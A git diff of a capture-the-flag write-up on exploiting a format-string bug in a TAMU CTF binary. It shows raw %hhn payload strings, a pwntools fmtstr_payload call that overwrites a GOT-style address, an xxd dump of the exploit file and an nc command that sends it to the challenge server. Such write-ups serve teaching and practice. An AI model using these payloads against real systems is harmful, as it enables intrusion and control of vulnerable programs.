@@ -155,7 +155,7 @@ We can use [positional arguments](http://stackoverflow.com/a/6322594/1833653) to
 
 **Alternative approach instead of appending 38 A's**
 
-Alternatively, before the 2nd address, we can write a dummy dword \(`0xDEADBEEF` here\) and use something like `%38x`, however other field width sub-specifier also have to be reduced by 4.
+Alternatively, before the 2nd address, we can write a dummy dword \(`0xDEADBEEF` here\) and use something like `%38x`, however other field width sub-specifier also have to be reduced by 4.
 
 ```
 \x1d\xa0\x04\x08\xDE\xAD\xBE\xEF\x1c\xa0\x04\x08%08x%08x%105x%hhn%38x%hhn
@@ -176,6 +176,12 @@ open('exploit', 'w').write(fmtstr_payload(4, {0x0804a01c: 0x080485ab}, write_siz
 #### Profit :\)
 
 ```bash
+$ xxd exploit 
+0000000: 1ca0 0408 1da0 0408 1ea0 0408 1fa0 0408  ................
+0000010: 2531 3535 6325 3424 6868 6e25 3231 3863  %155c%4$hhn%218c
+0000020: 2535 2468 686e 2531 3237 6325 3624 6868  %5$hhn%127c%6$hh
+0000030: 6e25 3463 2537 2468 686e                 n%4c%7$hhn
+
 $ nc pwn.ctf.tamu.edu 4323 < exploit
 Enter a word to be echoed:
 ����                       This function has been deprecated
